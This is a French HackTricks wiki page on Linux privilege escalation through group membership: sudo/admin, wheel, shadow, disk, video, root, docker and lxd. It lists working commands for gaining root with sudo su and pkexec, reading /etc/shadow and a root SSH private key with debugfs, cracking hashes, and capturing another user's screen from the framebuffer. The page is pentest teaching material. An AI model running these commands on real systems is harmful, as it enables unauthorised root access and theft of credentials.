{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) pour construire et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Groupes Sudo/Admin

## **PE - Méthode 1**

**Parfois**, **par défaut \(ou parce que certains logiciels en ont besoin\)**, vous pouvez trouver certaines de ces lignes dans le fichier **/etc/sudoers** :
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe sudo ou admin peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter**:
```text
sudo su
```
## PE - Méthode 2

Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec** :
```bash
find / -perm -4000 2>/dev/null
```
Si vous constatez que le binaire pkexec est un binaire SUID et que vous appartenez à sudo ou admin, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant pkexec.  
Vérifiez le contenu de :
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Là, vous trouverez quels groupes sont autorisés à exécuter **pkexec** et **par défaut** dans certains linux peuvent **apparaître** certains des groupes **sudo ou admin**.

Pour **devenir root, vous pouvez exécuter**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si vous essayez d'exécuter **pkexec** et que vous obtenez cette **erreur** :
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Ce n'est pas parce que vous n'avez pas de permissions mais parce que vous n'êtes pas connecté sans une interface graphique**. Et il existe une solution à ce problème ici : [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes** :

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Groupe Wheel

**Parfois**, **par défaut** dans le **fichier /etc/sudoers**, vous pouvez trouver cette ligne :
```text
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe wheel peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter**:
```text
sudo su
```
# Groupe Shadow

Les utilisateurs du **groupe shadow** peuvent **lire** le **/etc/shadow** fichier :
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Alors, lisez le fichier et essayez de **craquer quelques hashes**.

# Groupe de Disque

Ce privilège est presque **équivalent à l'accès root** car vous pouvez accéder à toutes les données à l'intérieur de la machine.

Fichiers : `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Notez qu'en utilisant debugfs, vous pouvez également **écrire des fichiers**. Par exemple, pour copier `/tmp/asd1.txt` vers `/tmp/asd2.txt`, vous pouvez faire :
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Cependant, si vous essayez de **modifier des fichiers appartenant à root** \(comme `/etc/shadow` ou `/etc/passwd`\), vous obtiendrez une erreur "**Permission denied**".

# Groupe Vidéo

En utilisant la commande `w`, vous pouvez trouver **qui est connecté au système** et cela affichera une sortie comme celle-ci :
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Le **tty1** signifie que l'utilisateur **yossi est connecté physiquement** à un terminal sur la machine.

Le **groupe vidéo** a accès pour voir la sortie de l'écran. En gros, vous pouvez observer les écrans. Pour ce faire, vous devez **capturer l'image actuelle à l'écran** en données brutes et obtenir la résolution que l'écran utilise. Les données de l'écran peuvent être enregistrées dans `/dev/fb0` et vous pouvez trouver la résolution de cet écran dans `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Pour **ouvrir** l'**image brute**, vous pouvez utiliser **GIMP**, sélectionner le fichier **`screen.raw`** et choisir comme type de fichier **Données d'image brute** :

![](../../.gitbook/assets/image%20%28208%29.png)

Ensuite, modifiez la largeur et la hauteur pour celles utilisées sur l'écran et vérifiez différents types d'image \(et sélectionnez celui qui montre mieux l'écran\) :

![](../../.gitbook/assets/image%20%28295%29.png)

# Groupe Root

Il semble qu'en par défaut, les **membres du groupe root** pourraient avoir accès à **modifier** certains fichiers de configuration de **service** ou certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...

**Vérifiez quels fichiers les membres root peuvent modifier** :
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Groupe Docker

Vous pouvez monter le système de fichiers racine de la machine hôte sur le volume d'une instance, de sorte que lorsque l'instance démarre, elle charge immédiatement un `chroot` dans ce volume. Cela vous donne effectivement un accès root sur la machine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Groupe lxc/lxd

[lxc - Escalade de privilèges](lxd-privilege-escalation.md)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) pour construire et **automatiser des flux de travail** facilement alimentés par les **outils communautaires les plus avancés** au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
